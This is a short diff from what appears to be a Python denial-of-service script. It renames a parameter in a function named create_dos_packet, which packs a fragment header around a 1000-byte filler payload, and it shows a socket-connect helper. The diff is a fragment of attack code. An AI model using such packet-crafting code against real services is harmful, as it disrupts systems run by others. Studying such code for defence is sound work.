@@ -10,15 +10,15 @@ def open_socket(host, port):
     sock.connect((host, port))
     return sock
 
-def create_dos_packet(fragment_id, length_of_fragment):
+def create_dos_packet(fragment_id, number_of_fragments):
     fragment = "A" * 1000
     _buffer = struct.pack(
         "<HHHHH",
-        5,                  # id
-        len(fragment) + 6,  # full packet
-        fragment_id,        # fragment id
-        length_of_fragment, # number of fragments
-        1000                # length of a fragment
+        5,                   # id
+        len(fragment) + 6,   # full packet
+        fragment_id,         # fragment id
+        number_of_fragments, # number of fragments
+        1000                 # length of a fragment
     )
     _buffer += fragment
     return _buffer
